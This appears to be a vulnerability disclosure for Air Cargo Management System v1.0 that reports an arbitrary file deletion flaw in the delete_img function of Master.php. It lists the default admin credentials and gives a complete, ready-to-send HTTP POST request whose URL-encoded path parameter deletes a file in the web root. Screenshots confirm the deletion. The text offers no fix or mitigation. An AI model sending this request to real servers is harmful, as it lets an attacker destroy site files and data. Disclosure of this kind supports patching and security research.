# Air Cargo Management System v1.0 by oretnom23 has Delete any file

vendors: https://www.sourcecodester.com/php/15188/air-cargo-management-system-php-oop-free-source-code.html

Vulnerability File: /acms/classes/Master.php?f=delete_img

Vulnerability location: /acms/classes/Master.php?f=delete_img, path

The password for the backend login account is: admin/admin123

Payload: 

Here we delete the shel.php file in the root directory

```sql
POST /acms/classes/Master.php?f=delete_img HTTP/1.1
Host: 192.168.1.19
Content-Length: 45
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.19
Referer: http://192.168.1.19/acms/admin/?page=system_info
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=8j006kgjjl9sdts88scke1lkuq
Connection: close

path=C%3A%2Fxampp%2Fhtdocs%2Facms%2Fshell.php // Here we delete the shel.php file in the root directory
```
The file path needs to be encoded by url

![image](https://user-images.githubusercontent.com/54017627/166402459-930d4ca2-5f32-46f2-ba9f-7b38cde2d075.png)

At present, the shell.php file is still in the root directory of the website, when we send a request to delete the shell.php file

![image](https://user-images.githubusercontent.com/54017627/166402507-6a52f008-8696-409c-9bb4-2f9ec56fd583.png)

The response package shows that the deletion was successful. Let's go to the root directory to see if the shell.php file still exists.

![image](https://user-images.githubusercontent.com/54017627/166402558-44eb9375-3cd9-433e-93fc-49d89c8d6074.png)

By this time, shell.php has been deleted.

![image](https://user-images.githubusercontent.com/54017627/166402608-06d159f2-3f77-4333-ba43-5a9eeb213ca1.png)
